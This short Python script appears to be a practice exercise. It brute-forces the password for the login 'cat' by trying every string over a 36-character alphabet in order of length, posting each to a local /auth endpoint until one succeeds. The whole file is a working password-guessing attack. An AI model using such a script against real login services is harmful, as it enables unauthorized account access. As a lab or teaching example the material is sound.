##n = i // 16
##rest = i % 16
##result = abc[rest] + '|' + result
##i = n
##abc='0123456789abcdef'
import requests
abc = 'qwertyuiopasdfghjklxcvbnmz0123456789'
base = len(abc)
i = 0
l = 0
while True:
    result = ''
    t=i
    while t > 0:
        rest = t % base
        result = abc[rest] + result
        t = t // base
    while len(result) < l:
        result = abc[0] + result
    data ={'login': 'cat', 'password': result}
    res = requests.post('http://127.0.0.1:5000/auth', json=data)
    if res.status_code == 200:
        print('success', result)
        break
    
    if result == abc[-1] * l:
        l += 1
        i = 0
    else: i += 1
